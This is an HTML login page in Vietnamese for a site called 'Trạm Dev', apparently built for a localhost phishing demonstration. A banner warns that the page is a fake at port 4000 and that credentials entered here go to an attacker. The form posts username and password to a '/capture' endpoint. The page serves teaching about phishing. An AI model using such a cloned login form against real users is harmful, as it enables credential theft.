<!doctype html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Đăng nhập - Trạm Dev</title>
    <style>
      :root {
        --bg: #f5f7f6;
        --surface: #ffffff;
        --ink: #101a24;
        --muted: #566472;
        --line: #dde3e8;
        --brand: #2646d9;
        --brand-ink: #ffffff;
        --mark: #ffd84a;
        --mark-ink: #3b2f00;
        --danger: #b42318;
        --danger-bg: #fef1f0;
        --r-s: 8px;
        --r-m: 12px;
        --serif: 'Iowan Old Style', 'Palatino Linotype', Palatino, 'Noto Serif', Georgia, serif;
        --sans: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      }
      @media (prefers-color-scheme: dark) {
        :root {
          --bg: #0d141b;
          --surface: #141d27;
          --ink: #e9eef3;
          --muted: #98a6b3;
          --line: #263341;
          --brand: #8ea4ff;
          --brand-ink: #0b1236;
          --danger: #ff9a90;
          --danger-bg: #3a1714;
        }
      }
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      body {
        font: 16px/1.6 var(--sans);
        background: var(--bg);
        color: var(--ink);
        min-height: 100vh;
        display: flex;
        flex-direction: column;
      }
      .nav {
        background: var(--surface);
        border-bottom: 1px solid var(--line);
        height: 4rem;
        display: flex;
        align-items: center;
        padding: 0 1.25rem;
      }
      .brand {
        display: flex;
        align-items: center;
        gap: 0.6rem;
        font: 700 1.1rem var(--serif);
        text-decoration: none;
        color: var(--ink);
      }
      .logo {
        width: 2rem;
        height: 2rem;
        border-radius: var(--r-s);
        background: var(--mark);
        color: var(--mark-ink);
        display: grid;
        place-items: center;
        font: 700 0.85rem var(--mono);
      }
      .warning-banner {
        background: var(--danger-bg);
        border-bottom: 1px solid var(--danger);
        color: var(--danger);
        padding: 0.75rem 1.25rem;
        font-size: 0.88rem;
        text-align: center;
      }
      .container {
        max-width: 28rem;
        width: 100%;
        margin: 3rem auto;
        padding: 0 1.25rem;
      }
      .card {
        background: var(--surface);
        border: 1px solid var(--line);
        border-radius: var(--r-m);
        padding: 2rem;
      }
      h1 {
        font: 700 1.6rem var(--serif);
        margin-bottom: 0.5rem;
      }
      p.desc {
        color: var(--muted);
        font-size: 0.95rem;
        margin-bottom: 1.5rem;
      }
      .field {
        margin-bottom: 1.25rem;
      }
      label {
        display: block;
        font-weight: 600;
        font-size: 0.92rem;
        margin-bottom: 0.4rem;
      }
      input {
        width: 100%;
        padding: 0.65rem 0.8rem;
        border: 1px solid var(--line);
        border-radius: var(--r-s);
        background: var(--bg);
        color: var(--ink);
        font: inherit;
      }
      input:focus {
        outline: 2px solid var(--brand);
        border-color: transparent;
      }
      button.btn {
        width: 100%;
        padding: 0.7rem;
        border-radius: var(--r-s);
        border: none;
        background: var(--brand);
        color: var(--brand-ink);
        font: 600 1rem var(--sans);
        cursor: pointer;
      }
      button.btn:hover {
        filter: brightness(1.08);
      }
    </style>
  </head>
  <body>
    <div class="warning-banner">
      ⚠️ <strong>Lưu ý bảo mật:</strong> Bạn đang ở
      <code>http://localhost:4000/phishing.html</code>, không phải
      <code>http://localhost:3000</code>. Trong tấn công giả mạo (phishing), việc nhập thông tin tại
      đây sẽ gửi mật khẩu của bạn đến máy chủ kẻ tấn công.
    </div>
    <header class="nav">
      <a class="brand" href="/">
        <span class="logo" aria-hidden="true">&lt;/&gt;</span>
        <span>Trạm Dev</span>
      </a>
    </header>
    <main class="container">
      <div class="card">
        <h1>Đăng nhập</h1>
        <p class="desc">Tiếp tục từ nơi bạn đã dừng để bình luận và quản lý hồ sơ.</p>
        <form action="/capture" method="POST">
          <div class="field">
            <label for="u">Tên đăng nhập</label>
            <input id="u" name="username" type="text" autocomplete="username" required />
          </div>
          <div class="field">
            <label for="p">Mật khẩu</label>
            <input
              id="p"
              name="password"
              type="password"
              autocomplete="current-password"
              required
            />
          </div>
          <button class="btn" type="submit">Đăng nhập</button>
        </form>
      </div>
    </main>
  </body>
</html>
